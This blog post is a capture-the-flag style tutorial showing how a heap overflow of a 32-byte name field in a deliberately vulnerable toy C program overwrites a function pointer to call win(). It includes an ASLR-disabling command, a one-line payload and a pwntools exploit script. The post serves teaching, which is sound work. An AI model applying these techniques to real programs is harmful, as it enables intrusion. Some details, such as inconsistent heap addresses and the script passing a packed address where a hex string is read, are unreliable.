---
layout: post
title: "Simple Heap Buffer Overflow"
date: 2020-10-21
---

Earlier today, I was messing around with some code, and I came up with [this vulnerable program](../../../assets/other/2020-10-21-heap-buffer-overflow/people.c). This program was written using bad programming habits on purpose, and I am going to show you how it is vulnerable to a buffer overflow. This isn't a complicated vulnerability, and while it does involve corrupting memory on the heap, it does not require you to have in-depth knowledge about how the heap works (unlike many other heap exploits).

```bash
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

First of all, I am going to disable ASLR on my computer using the above command. This will make explaining the vulnerability a little bit easier, but later, I will show you a Python script that works even if ASLR is enabled.

```
$ ./people
win() is at 0x55555555529f.

Valid commands:
new: Give birth to a new person.
greet: Say hello to a person.
kill: Kill a person.
quit: Stop the program.

> 
```

When you first run the program, you'll see that it leaks the location of a function called `win()`. Our goal is to execute `win()`, which prints out the flag.

```c
void win() {
    printf("flag{insert_flag_here}\n");
}
```

The program allows the user to type in various commands, so let's see what happens when we issue the "new" command while running the program.

```
> new
Enter the person's name: Nihaal
Nihaal was born at 0x555555559ac0.
```

The new command allows the user to create a new `Person` on the heap, and it will print out the heap address where it was created. In this case, the program stored information about our `Person` at address `0x555555559ac0`. Looking at the code, we can see that this is implemented using a structure called `Person`.

```c
typedef struct _Person Person;
typedef void (*func)(Person *);

typedef struct _Person {
    char name[32];
    func greeting;
} Person;
```

Something that is interesting is that this structure also contains a function pointer called `greeting`. If we look a little bit further down in the code, we can see that there are two more functions, each of which contain some kind of greeting.

```c
void hello(Person *p) {
    printf("%s says hello.\n", p->name);
}

void yo(Person *p) {
    printf("%s says yo.\n", p->name);
}
```

Let's go back to the running program again and use the `greet` command to see what happens.

```
> greet
Type in the address of the person you want to say hi to: 0x555555559ac0
You say hello to Nihaal.
Nihaal says yo.
> 
```

Interesting. What happens if we create another user and do the same thing?

```
> new
Enter the person's name: Sam
Sam was born at 0x555555559af0.
> greet
Type in the address of the person you want to say hi to: 0x555555559af0
You say hello to Sam.
Sam says hello.
> 
```

Notice how in the first instance, we were greated with "yo," but in the second instance, we were greated with "hello." What is happening here is that in the first `Person` instance, we had set the function pointer `greeting` equal to `yo`, and it had executed the `yo()` function. In the second `Person` instance, we had set the function pointer `greeting` equal to `hello`, and it executed the `hello()` function instead.

This is essentially how object-oriented programming and polymorphism can be emulated in C. While C is obviously not an object-oriented language, you can still incorporate object-oriented behavior in C code by maintaining pointers to functions in structures. When you want to change the behavior of an object, all you have to do is change the function pointer in its structure for that instance of the object.

Let's take a look at the code responsible for dealing with the `new` command, which is located in `main()`. I've added some comments to the code to explain what's going on.
```c
if(strncmp(buf, "new", 3) == 0) { // Buf contains the user input, and it can have a maximum of BUF_SIZE characters.
    p = malloc(sizeof(Person)); // p is a Person* variable
                                // Whoops, I forget to check for malloc() returning NULL. Oh well.
    p->greeting = greeting_flip ? hello : yo; // Set the greeting to be either hello() or yo()
                                              // Note that greeting_flip is initialized to 0, so "yo" will always be the first greeting
    greeting_flip = !greeting_flip; // Use the other greeting next time
    printf("Enter the person\'s name: ");
    fgets(buf, BUF_SIZE, stdin); // Get user input
    sscanf(buf, "%s", p->name); // Copy the person's name to the name buffer in p
    printf("%s was born at %p.\n", p->name, p); // Print out the location where p is stored on the heap
}
```

The `p` variable is a type of `Person` that was just allocated memory using `malloc()`. The `greeting_flip` variable is initially set to 0, which means that `greeting` will always be first set to `yo`. It will then flip back and forth between using `hello` and using `yo` as the greeting function whenever you create a new `Person`.

Now lets take a look at the code responsible for dealing with the `greet` command, which is also located in `main()`.
```
else if(strncmp(buf, "greet", 5) == 0) { // Check if user input is "greet"
    printf("Type in the address of the person you want to say hi to: ");
    fgets(buf, BUF_SIZE, stdin); // Scan the address into buf
    sscanf(buf, "%p", &p); // Convert the address into a Person* pointer
    printf("You say hello to %s.\n", p->name);
    p->greeting(p); // Execute the greeting function
}
```

Once you use the `greet` command, notice how the program executes whatever function `greeting` is equal to. What if there was a way for us to control the function pointer `greeting`? If we were able to set `greeting` equal to the address of `win()`, then we could execute `win()` when we greet a person. This would print out the flag and solve the problem!

Note that in both code segments, the call to `fgets()` uses `BUF_SIZE` as the size of the buffer. From the programmer's perspective, this makes sense because `buf` is an array on the stack with length `BUF_SIZE`. Scroll to the top of the C file to see what `BUF_SIZE` is.

```c
#define BUF_SIZE 128
```

Wait, hold on a second. Wasn't the `name` buffer in `Person` only 32 bytes long? We were copying whatever string was inside the buffer to `name`, so can we overflow the `name` buffer? Are we able to overwrite the value of the `greeting` pointer that comes directly after `name`? To answer these questions, let's see what happens when we give the program a large input value.

```
$ ./people
win() is at 0x55555555529f.

Valid commands:
new: Give birth to a new person.
greet: Say hello to a person.
kill: Kill a person.
quit: Stop the program.

> new
Enter the person's name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA was born at 0x555555559ac0.
> greet
Type in the address of the person you want to say hi to: 0x555555559ac0
You say hello to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
Segmentation fault
```

The program gave us a segmentation fault after we tried to greet that person. This means that we most likely overwrote the `greeting` parameter, and if we're able to control the `greeting` parameter, we can execute whatever function we want to! Since the `name` attribute is 32 characters long, we could probably just write the address of `win()` right after it. Then we could use the `greet` command to execute our code.

Since ASLR is currently disabled, we know that the address of `win()` will always be `0x55555555529f`, which is written as `b'\x9fRUUUU'` as a Python little-endian byte string. Also, because ASLR is disabled, we also know that the first address that `malloc()` will return will always be `0x55555555a6c0`. This address does not have to be inputted in little endian format because the `%p` string formatter automatically converts it to little-endian format.

```
$ python -c "import sys; sys.stdout.buffer.write(b'new\n' + b'A'*32 + b'\x9fRUUUU' + b'\ngreet\n' + b'0x55555555a6c0\n' + b'q\n')" | ./people
win() is at 0x55555555529f.

Valid commands:
new: Give birth to a new person.
greet: Say hello to a person.
kill: Kill a person.
quit: Stop the program.

> Enter the person's name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�RUUUU was born at 0x55555555a6c0.
> Type in the address of the person you want to say hi to: You say hello to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�RUUUU.
flag{insert_flag_here}
> Ending program.
```

My exploit above will first issue the "new" command to create a new `Person`. Then it will overflow the `name` buffer on the heap so that we are able to overwrite `greeting` with the address of `win()`. From there, we issue a `greet` command. The `greet` command requires the address of the `Person` as input, and since we know that `malloc()` will always first return `0x55555555a6c0`, we can just supply that as the `Person`'s address. This will execute the function that `greeting` points to, which is `win()` in this case. From there, we can issue the `q` command to exit the program.

This exploit uses hardcoded addresses, but since the program leaks the addresses of `win()` and each `Person` that we create, it is simple to write a script that exploits this program even when ASLR is enabled.

```
from pwn import *

# Start the process and get the flag
p = process("./people")
win_addr = p64(int(str(p.recv()).split("\\n")[0].split(" ")[3][:-1], 16))

# Create a new person, set his/her greeting to win_addr, and get their address
p.sendline(b"new")
p.sendline(b"A"*32 + win_addr)
person_addr = p64(int(str(p.recv()).split("\\n")[0].split()[9][:-1], 16))

# Execute the win() function and get the flag
p.sendline(b"greet")
p.sendline(person_addr)
print(str(p.recv()).split("\\n")[1])

# End the program
p.sendline(b"kill")
p.sendline(person_addr)
p.sendline(b"q")
```

And this is what happens when we run the script with ASLR turned on.

```
$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
2
$ python solver.py
[+] Starting local process './people': pid 40221
flag{insert_flag_here}
```


{% include related_posts.html %}
